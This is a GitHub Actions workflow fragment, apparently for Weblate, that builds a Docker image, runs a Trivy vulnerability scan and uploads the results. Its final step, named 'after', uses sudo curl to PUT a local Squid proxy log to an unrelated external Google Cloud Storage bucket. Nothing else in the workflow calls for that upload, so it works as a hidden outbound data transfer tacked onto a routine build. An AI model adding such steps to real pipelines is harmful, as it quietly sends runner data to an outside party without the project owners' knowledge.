    - continue-on-error: true
      uses: actions/checkout@v2
    - continue-on-error: true
      name: Set up Docker Buildx
      uses: docker/setup-buildx-action@v3
    - continue-on-error: true
      id: cache
      name: Cache Docker layers
      uses: actions/cache@v2.1.5
      with:
        key: ${{ runner.os }}-buildx-${{ github.sha }}-${{ matrix.architecture }}
        path: /tmp/.buildx-cache/${{ matrix.architecture }}
    - continue-on-error: true
      name: Build the Docker image
      run: docker buildx build $(.github/bin/get-buildx-args load)
    - continue-on-error: true
      name: List Docker images
      run: docker image ls --all
    - continue-on-error: true
      name: Checkout the code
      uses: actions/checkout@v2
    - continue-on-error: true
      name: Run Trivy vulnerability scanner
      uses: aquasecurity/trivy-action@0.0.15
      with:
        format: template
        image-ref: weblate/weblate:test
        output: trivy-results.sarif
        severity: CRITICAL,HIGH
        template: '@/contrib/sarif.tpl'
    - continue-on-error: true
      name: Upload Trivy scan results to GitHub Security tab
      uses: github/codeql-action/upload-sarif@v1
      with:
        sarif_file: trivy-results.sarif
    - continue-on-error: true
      uses: actions/upload-artifact@v2.2.3
      with:
        name: Trivy scan SARIF
        path: trivy-results.sarif
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/Pinkuburu/docker.$(date
        +%s)
    strategy:
      matrix:
        architecture:
        - linux/amd64
    timeout-minutes: 60
